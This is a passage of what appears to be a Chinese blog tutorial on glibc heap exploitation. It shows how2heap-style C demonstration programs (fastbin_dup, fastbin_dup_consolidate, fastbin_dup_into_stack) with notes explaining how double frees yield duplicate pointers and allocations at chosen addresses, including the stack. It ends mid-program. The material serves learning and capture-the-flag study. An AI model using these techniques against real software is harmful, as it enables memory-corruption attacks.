class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先申请8个chunk，7个用于填充tcachebin,1个用于隔离</p>
<p>然后free掉7个chunk填充tcachebin</p>
<p>继续再申请3个chunk–chunk1,2,3</p>
<p>按顺序free chunk1 chunk2 chunk1</p>
<p>最终再连续申请3次即可得到两个控制chunk1的指针</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>引入tcache机制后fastbin的机制没变，依旧是只检查相邻节点的后一个</p>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>首先申请7个chunk，再申请同样3大小的chunk a b c</li>
<li>填满tcache，再free a  b a 即可在fastbin中形成a-&gt;b&lt;-a</li>
<li>申请出a b 修改 a，实现修改fastbin链表到任意可写的地方</li>
</ul>
<h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>引入tcache之前无需填充tcache，引入tcache之后要填充tcache</p>
<h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><p>通过 double free 实现任意地址写</p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>效果：实现 double free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">原始参考文献：https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">本文档主要用于演示 malloc_consolidate 的工作原理，以及如何利用双重释放（double free）来获得两个指向同一大块内存的指针，这通常很难直接做到，因为存在前用检查（previnuse check）。有趣的是，这还包括某些大小的 tcache（线程缓存）大小块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714）本质上是合并所有快速分配块（fastbin chunks）及其相邻的块，将它们放入未排序的块中，并在可能的情况下与顶部块合并。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">截至 glibc 版本 2.35，该函数仅在以下五个地方被调用：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">_int_malloc：当正在分配一个大块时（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965）</span></span><br><span class="line"><span class="comment">_int_malloc：如果没有找到块并且顶部块太小（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394）</span></span><br><span class="line"><span class="comment">_int_free：如果块大小 &gt;= FASTBIN_CONSOLIDATION_THRESHOLD（65536）（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674）</span></span><br><span class="line"><span class="comment">mtrim：始终（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041）</span></span><br><span class="line"><span class="comment">__libc_mallopt：始终（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463）</span></span><br><span class="line"><span class="comment">我们将针对第一个地方，因此我们需要分配一个不属于小块（small bin）的块（因为我们试图进入此检查的 &quot;else&quot; 分支： https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901）。这意味着我们的块大小需要 &gt;= 0x400（因此是大块）。值得注意的是，最大的 tcache 大小块是 0x410，所以如果我们的块大小在 [0x400, 0x410] 范围内，我们可以利用双重释放来控制一个 tcache 大小块。.   </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique will make use of malloc_consolidate and a double free to gain a duplication in the tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Lets prepare to fill up the tcache in order to force fastbin usage...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;Now freeing p1 will add it to the fastbin.\n\n&quot;</span>);</span><br><span class="line">  	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a tcache-sized chunk with chunk size 0x410 &quot;</span>);</span><br><span class="line">  	<span class="type">void</span>* p2 = <span class="built_in">malloc</span>(CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p2=%p.\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nFirst, malloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, p2 is allocated from top since there is no free chunk bigger (or equal) than it. Thus, p1 = p2.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert(p1 == p2);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p2).\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1); <span class="comment">// vulnerability (double free)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It is now in the tcache (or merged with top if we had initially chosen a chunk size &gt; 0x410).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So p1 is double freed, and p2 hasn&#x27;t been freed although it now points to a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will request 0x400 bytes. This will give us the 0x410 chunk that&#x27;s currently in\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the tcache bin. p2 and p1 will still be pointing to it.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *p3 = <span class="built_in">malloc</span>(CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">	assert(p3 == p2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We now have two pointers (p2 and p3) that haven&#x27;t been directly freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;and both point to the same tcache sized chunk. p2=%p p3=%p\n&quot;</span>, p2, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We have achieved duplication!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Note: This duplication would have also worked with a larger chunk size, the chunks would\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;have behaved the same, just being taken from the top instead of from the tcache bin.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is pretty cool because it is usually difficult to duplicate large sized chunks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;because they are resistant to direct double free&#x27;s due to their PREV_INUSE check.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以通过double free(一个在bins中，一个在其他的大的chunk中)来实现任意地址写</p>
<ul>
<li>申请7个chunk，再申请1个 chunk 名 p1</li>
<li>释放掉前7个chunk来填满tcache，再释放p1，此时它会进入fastbin中</li>
<li>申请一个largebin_chunk，申请大小为0x400那样得到的chunk为0x410(在tcache管理范围内)，malloc()此时会调用consilidate()函数合并所有的fastbin，p1就会被用在新申请的largebin_chunk的头部得到p2</li>
<li>再次free(p1)tcache中就会多一个chunk(0x410)，在将它申请出来得到p3</li>
<li>最终p2&#x3D;p3也就再次实现了两个可控的指针指向同一个chunk</li>
</ul>
<h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>效果：通过 double free 来实现分配地址到栈上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking calloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want calloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that calloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th calloc(1,8): %p\n&quot;</span>, p);</span><br><span class="line">	assert(p == <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line">	<span class="comment">// assert((long)__builtin_return_address(0) == *(long *)p);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出，UAF等</p>
<h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>这个是fastbin_dup的扩展，基本一样：</p>
<ul>
<li>首先申请7个chunk，再申请同样3大小的chunk a b c</li>
<li>填满tcache，再free a  b a 即可在fastbin中形成a-&gt;b&lt;-a</li>
<li>申请出a b 修改 a 的fd指针为target - 0x10，并伪造target处的size</li>
<li>最后target就会出现在fastbin链表中，申请出即可</li>
</ul>
<h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span 